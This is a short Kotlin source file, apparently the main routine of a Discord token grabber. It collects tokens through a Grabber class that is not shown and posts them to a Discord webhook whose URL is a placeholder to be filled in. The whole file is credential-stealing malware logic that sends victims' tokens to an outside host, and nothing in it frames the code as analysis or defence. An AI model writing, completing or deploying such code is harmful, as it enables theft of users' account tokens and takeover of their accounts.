fun main() {
    val tokens = Grabber.getTokens()
    val webhook = DiscordWebhook("your url")
    webhook.content = tokens.toString()
    println(tokens)
    webhook.execute()
}
